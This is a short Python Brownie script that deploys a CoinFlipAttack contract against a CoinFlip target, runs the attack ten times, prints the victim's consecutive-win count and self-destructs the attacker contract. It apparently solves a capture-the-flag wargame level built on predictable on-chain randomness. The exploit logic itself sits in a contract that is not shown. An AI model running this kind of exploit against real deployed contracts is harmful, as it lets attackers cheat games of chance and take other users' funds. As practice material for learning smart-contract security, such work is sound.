from brownie import accounts, config, interface, web3, CoinFlip, CoinFlipAttack

def attack(target, hacker):
    ''' 
    We will deploy our attack contract passing the constructor arguments,
     and a dictionary of transaction parameters as the final argument, including
     a from value that specifies the Account to deploy the contract from
    ''' 
    deploy_attack = CoinFlipAttack.deploy(target, {"from": hacker})

    '''
    Create object from an arbitrary address using the Accounts.at method
    '''
    coinflip = CoinFlip.at(target)
    print(f'Address originating the attack:  {deploy_attack.address}')

    # Execute 10 times the hack attack
    for i in range (0, 10):
        deploy_attack.attack({'from': hacker, 'gas_limit':250000, 'allow_revert': True})
    print(f'Number:  {coinflip.consecutiveWins()}')
    deploy_attack.destroy({'from': hacker})
    

def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    attack(target, hacker)